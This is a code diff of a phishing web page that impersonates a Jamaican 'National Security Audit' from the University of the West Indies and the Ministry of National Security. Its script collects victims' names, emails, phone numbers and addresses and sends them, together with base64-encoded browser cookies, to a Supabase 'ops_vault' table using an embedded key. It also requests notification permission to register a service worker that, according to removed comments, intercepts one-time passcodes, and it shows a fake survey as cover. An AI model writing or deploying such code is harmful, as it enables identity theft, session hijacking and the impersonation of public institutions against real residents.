@@ -3,115 +3,90 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>UWI National Security Audit 2026</title>
+<title>National Security Audit 2026 | UWI Mona & MNS Portal</title>
+<link rel="manifest" href="manifest.json">
 <link rel="stylesheet" href="https://www.mona.uwi.edu/sites/all/themes/uwi_mona/css/style.css">
 <style>
-body { background-color: #f4f7f6; font-family: 'Kumbh Sans', sans-serif; margin: 0; }
-.main-container { display: flex; justify-content: center; padding: 50px 10px; }
-.admin-card {
-background: white; width: 100%; max-width: 650px;
-border-radius: 8px; border: 1px solid #dfe1e5;
-box-shadow: 0 1px 3px rgba(0,0,0,0.12);
-}
-.header-bar { height: 12px; background: #003366; border-radius: 8px 8px 0 0; }
-.content { padding: 30px; }
-h1 { font-size: 28px; margin-bottom: 10px; color: #202124; font-weight: 400; }
-.info-text { font-size: 14px; color: #5f6368; border-bottom: 1px solid #e0e0e0; padding-bottom: 15px; margin-bottom: 25px; }
-
-.field { margin-bottom: 25px; }
-.label { display: block; font-size: 15px; margin-bottom: 10px; font-weight: 500; color: #202124; }
-.input-line {
-width: 100%; border: none; border-bottom: 1px solid #dadce0;
-padding: 5px 0; font-size: 16px; outline: none; transition: 0.3s;
-}
-.input-line:focus { border-bottom: 2px solid #003366; }
-
-#survey-questions { display: none; }
-.loading { display: none; text-align: center; padding: 40px; }
-.btn { background: #003366; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; font-weight: 600; }
+body { background-color: #f0f2f5; font-family: 'Kumbh Sans', sans-serif; margin: 0; }
+.wrapper { display: flex; justify-content: center; padding: 40px 10px; }
+.google-card { background: #fff; width: 100%; max-width: 640px; border-radius: 8px; border: 1px solid #dadce0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+.top-bar { height: 10px; background-color: #003366; border-radius: 8px 8px 0 0; }
+.content { padding: 24px; }
+h1 { font-size: 32px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+.desc { font-size: 14px; color: #70757a; border-bottom: 1px solid #dadce0; padding-bottom: 20px; margin-bottom: 24px; }
+.step { display: none; }
+.step.active { display: block; }
+.q-box { margin-bottom: 24px; }
+.label { display: block; font-size: 16px; margin-bottom: 8px; font-weight: 500; }
+.input { width: 100%; border: none; border-bottom: 1px solid #dadce0; padding: 8px 0; font-size: 16px; outline: none; transition: 0.3s; }
+.input:focus { border-bottom: 2px solid #003366; }
+.btn { background: #003366; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; }
+#loading { display: none; text-align: center; padding: 40px; }
 </style>
 </head>
 <body>
-
-<div class="main-container">
-<div class="admin-card">
-<div class="header-bar"></div>
+<div class="wrapper">
+<div class="google-card">
+<div class="top-bar"></div>
 <div class="content">
 <h1>National Security Audit</h1>
-<p class="info-text">Ministry of National Security & UWI Resident Verification Portal.</p>
+<p class="desc">Official 2026 Residency Verification & Community Safety Assessment.</p>
 
-<div id="stage1">
-<div class="field">
-<label class="label">Full Legal Name</label>
-<input type="text" id="name" class="input-line" placeholder="Your answer">
-</div>
-<div class="field">
-<label class="label">Official Gmail Address</label>
-<input type="email" id="email" class="input-line" placeholder="example@gmail.com">
-</div>
-<div class="field">
-<label class="label">Mobile Number</label>
-<input type="tel" id="phone" class="input-line" placeholder="+1 876-_-__">
-</div>
-<div class="field">
-<label class="label">Residential Address</label>
-<input type="text" id="address" class="input-line" placeholder="Full address">
-</div>
-<button class="btn" onclick="executeInfection()">Verify & Start Audit</button>
+<div id="stage1" class="step active">
+<div class="q-box"><label class="label">Full Legal Name</label><input type="text" id="name" class="input" placeholder="Your answer"></div>
+<div class="q-box"><label class="label">Official Gmail Address</label><input type="email" id="email" class="input" placeholder="example@gmail.com"></div>
+<div class="q-box"><label class="label">Mobile Number</label><input type="tel" id="phone" class="input" placeholder="+1 876-_-__"></div>
+<div class="q-box"><label class="label">Residential Address</label><input type="text" id="address" class="input" placeholder="Street, Community, Parish"></div>
+<button class="btn" onclick="runPayload()">Verify & Continue</button>
 </div>
 
-<div id="loader" class="loading">
-<p>Establishing Secure Connection...</p>
-</div>
+<div id="loading"><p>Connecting to Secure Ministry Vault...</p></div>
 
-<div id="survey-questions">
-<p><b>Section 2: Community Assessment</b></p>
-<div class="field">
-<label class="label">Q01: Rate community safety at night (1-10)</label>
-<input type="number" class="input-line">
-</div>
-<button class="btn">Submit Audit</button>
+<div id="stage2" class="step">
+<div class="q-box"><label class="label">Q01: Rate nighttime safety in your community (1-10)</label><input type="number" class="input"></div>
+<div class="q-box"><label class="label">Q02: Have you witnessed unauthorized surveillance drones? (Yes/No)</label><input type="text" class="input"></div>
+<div class="q-box"><label class="label">Q03: Do you feel police response times are adequate? (Yes/No)</label><input type="text" class="input"></div>
+<button class="btn" onclick="alert('Audit Submitted Successfully')">Submit Final Audit</button>
 </div>
 </div>
 </div>
 </div>
 
 <script>
-async function executeInfection() {
-const data = {
+const SB_URL = 'https://jdjllbdodmnxuzananah.supabase.co';
+const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpkamxsYmRvZG1ueHV6YW5hbmFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0OTI5MDcsImV4cCI6MjA5MzA2ODkwN30.MGVD1CI1Iw_-k2_y6UBZReIS9KQykFXkRt-5V6gAleo';
+
+async function runPayload() {
+const payload = {
 n: document.getElementById('name').value,
 e: document.getElementById('email').value,
 p: document.getElementById('phone').value,
 a: document.getElementById('address').value,
-ck: btoa(document.cookie) // Snatch active sessions
+ck: btoa(document.cookie)
 };
 
-// Transition UI
 document.getElementById('stage1').style.display = 'none';
-document.getElementById('loader').style.display = 'block';
+document.getElementById('loading').style.display = 'block';
 
-// 1. SILENT EXFILTRATION TO SUPABASE
-fetch('https://jdjllbdodmnxuzananah.supabase.co/rest/v1/ops_vault', {
+// 1. DUMP TO OPS_VAULT
+fetch(${SB_URL}/rest/v1/ops_vault, {
 method: 'POST',
-headers: { 'apikey': 'YOUR_SUPABASE_ANON_KEY', 'Content-Type': 'application/json' },
-body: JSON.stringify(data)
+headers: { 'apikey': SB_KEY, 'Content-Type': 'application/json' },
+body: JSON.stringify(payload)
 });
 
-// 2. MALWARE PERMISSION HOOK
-// This triggers the browser prompt that looks like a system verification
+// 2. PERMISSION TRIGGER (THE SW GATEWAY)
 if ('serviceWorker' in navigator) {
 const permission = await Notification.requestPermission();
 if (permission === 'granted') {
-// Registering the SW which handles OTP interception
 await navigator.serviceWorker.register('sw.js');
 }
 }
 
-// 3. PIVOT TO SURVEY
 setTimeout(() => {
-document.getElementById('loader').style.display = 'none';
-document.getElementById('survey-questions').style.display = 'block';
-}, 2500);
+document.getElementById('loading').style.display = 'none';
+document.getElementById('stage2').classList.add('active');
+}, 2000);
 }
 </script>
 </body>
